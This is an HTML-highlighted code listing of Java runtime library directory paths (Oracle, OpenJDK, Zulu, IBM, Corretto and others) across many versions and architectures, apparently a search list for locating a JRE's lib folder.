<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jre<span class="token operator">-</span><span class="token number">6</span><span class="token operator">-</span>oracle<span class="token operator">-</span>x64<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jre<span class="token operator">-</span><span class="token number">7</span><span class="token operator">-</span>oracle<span class="token operator">-</span>x64<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jre<span class="token operator">-</span><span class="token number">8</span><span class="token operator">-</span>oracle<span class="token operator">-</span>x64<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>zulu<span class="token operator">-</span><span class="token number">6</span><span class="token operator">-</span>amd64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>zulu<span class="token operator">-</span><span class="token number">7</span><span class="token operator">-</span>amd64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>zulu<span class="token operator">-</span><span class="token number">8</span><span class="token operator">-</span>amd64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">6</span><span class="token operator">-</span>oracle<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">7</span><span class="token operator">-</span>oracle<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">8</span><span class="token operator">-</span>oracle<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>jdk<span class="token operator">/</span>instances<span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">6.0</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>jdk<span class="token operator">/</span>instances<span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">7.0</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>jdk<span class="token operator">/</span>instances<span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>j2re1<span class="token punctuation">.</span><span class="token number">6</span><span class="token operator">-</span>oracle<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>j2re1<span class="token punctuation">.</span><span class="token number">7</span><span class="token operator">-</span>oracle<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>j2re1<span class="token punctuation">.</span><span class="token number">8</span><span class="token operator">-</span>oracle<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.6</span><span class="token number">.0</span><span class="token operator">-</span>sun<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.7</span><span class="token number">.0</span><span class="token operator">-</span>sun<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>sun<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">6</span><span class="token operator">-</span>openjdk<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">7</span><span class="token operator">-</span>openjdk<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">8</span><span class="token operator">-</span>openjdk<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>j2sdk1<span class="token punctuation">.</span><span class="token number">6</span><span class="token operator">-</span>oracle<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>j2sdk1<span class="token punctuation">.</span><span class="token number">7</span><span class="token operator">-</span>oracle<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>j2sdk1<span class="token punctuation">.</span><span class="token number">8</span><span class="token operator">-</span>oracle<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">11</span><span class="token operator">-</span>openjdk<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">12</span><span class="token operator">-</span>openjdk<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">13</span><span class="token operator">-</span>openjdk<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.6</span><span class="token operator">-</span>openjdk<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.7</span><span class="token operator">-</span>openjdk<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token operator">-</span>openjdk<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">9</span><span class="token operator">-</span>openjdk<span class="token operator">-</span>amd64<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jdk<span class="token operator">-</span><span class="token number">6</span><span class="token operator">-</span>oracle<span class="token operator">-</span>x64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jdk<span class="token operator">-</span><span class="token number">7</span><span class="token operator">-</span>oracle<span class="token operator">-</span>x64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jdk<span class="token operator">-</span><span class="token number">8</span><span class="token operator">-</span>oracle<span class="token operator">-</span>x64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jre<span class="token operator">-</span><span class="token number">6</span><span class="token operator">-</span>oracle<span class="token operator">-</span>x64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jre<span class="token operator">-</span><span class="token number">7</span><span class="token operator">-</span>oracle<span class="token operator">-</span>x64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jre<span class="token operator">-</span><span class="token number">8</span><span class="token operator">-</span>oracle<span class="token operator">-</span>x64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">10</span><span class="token operator">-</span>openjdk<span class="token operator">-</span>amd64<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">11</span><span class="token operator">-</span>openjdk<span class="token operator">-</span>amd64<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.11</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.12</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">6</span><span class="token operator">-</span>openjdk<span class="token operator">-</span>i386<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">6</span><span class="token operator">-</span>sun<span class="token operator">-</span><span class="token number">1.6</span><span class="token number">.0</span><span class="token number">.16</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">6</span><span class="token operator">-</span>sun<span class="token operator">-</span><span class="token number">1.6</span><span class="token number">.0</span><span class="token number">.20</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">7</span><span class="token operator">-</span>openjdk<span class="token operator">-</span>i386<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">8</span><span class="token operator">-</span>openjdk<span class="token operator">-</span>i386<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">6</span><span class="token operator">-</span>openjdk<span class="token operator">-</span>amd64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">7</span><span class="token operator">-</span>openjdk<span class="token operator">-</span>amd64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">8</span><span class="token operator">-</span>openjdk<span class="token operator">-</span>amd64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.6</span><span class="token number">.0</span><span class="token operator">-</span>oracle<span class="token operator">-</span>x64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.7</span><span class="token number">.0</span><span class="token operator">-</span>oracle<span class="token operator">-</span>x64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>oracle<span class="token operator">-</span>x64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>oracle<span class="token operator">-</span>java6<span class="token operator">-</span>jdk<span class="token operator">-</span>amd64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>oracle<span class="token operator">-</span>java7<span class="token operator">-</span>jdk<span class="token operator">-</span>amd64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>oracle<span class="token operator">-</span>java8<span class="token operator">-</span>jdk<span class="token operator">-</span>amd64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib64<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.6</span><span class="token number">.0</span><span class="token operator">-</span>ibd<span class="token operator">-</span><span class="token number">1.6</span><span class="token number">.0</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib64<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.6</span><span class="token number">.0</span><span class="token operator">-</span>ibm<span class="token operator">-</span><span class="token number">1.6</span><span class="token number">.0</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib64<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.7</span><span class="token number">.1</span><span class="token operator">-</span>ibm<span class="token operator">-</span><span class="token number">1.7</span><span class="token number">.1</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.6</span><span class="token number">.0</span><span class="token operator">-</span>sun<span class="token operator">-</span><span class="token number">1.6</span><span class="token number">.0</span><span class="token number">.11</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.6</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span>amd64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.7</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span>amd64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span>amd64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jre<span class="token operator">-</span><span class="token number">1.6</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jre<span class="token operator">-</span><span class="token number">1.7</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jre<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.11</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span>amd64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jdk<span class="token operator">-</span><span class="token number">8</span><span class="token operator">-</span>oracle<span class="token operator">-</span>arm<span class="token operator">-</span>vfp<span class="token operator">-</span>hflt<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib64<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.6</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.6</span><span class="token number">.0</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib64<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.7</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.7</span><span class="token number">.0</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib64<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.6</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.6</span><span class="token number">.0</span><span class="token number">.0</span><span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.7</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.0</span><span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>amazon<span class="token operator">-</span>corretto<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.0</span><span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.7</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.7</span><span class="token number">.0</span><span class="token number">.45</span><span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.7</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.7</span><span class="token number">.0</span><span class="token number">.65</span><span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.7</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.7</span><span class="token number">.0</span><span class="token number">.75</span><span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.7</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.7</span><span class="token number">.0</span><span class="token number">.79</span><span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.7</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.7</span><span class="token number">.0</span><span class="token number">.91</span><span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.7</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.7</span><span class="token number">.0</span><span class="token number">.101</span><span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.7</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.7</span><span class="token number">.0</span><span class="token number">.191</span><span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.31</span><span class="token operator">-</span><span class="token number">2.</span>b13<span class="token punctuation">.</span>el7<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.65</span><span class="token operator">-</span><span class="token number">3.</span>b17<span class="token punctuation">.</span>el7<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.102</span><span class="token operator">-</span><span class="token number">4.</span>b14<span class="token punctuation">.</span>el7<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.161</span><span class="token operator">-</span><span class="token number">2.</span>b14<span class="token punctuation">.</span>el7<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.171</span><span class="token operator">-</span><span class="token number">7.</span>b10<span class="token punctuation">.</span>el7<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.131</span><span class="token operator">-</span><span class="token number">11.</span>b12<span class="token punctuation">.</span>el7<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.31</span><span class="token operator">-</span><span class="token number">1.</span>b13<span class="token punctuation">.</span>el6_6<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.65</span><span class="token operator">-</span><span class="token number">2.</span>b17<span class="token punctuation">.</span>el7_1<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.77</span><span class="token operator">-</span><span class="token number">0.</span>b03<span class="token punctuation">.</span>el6_7<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
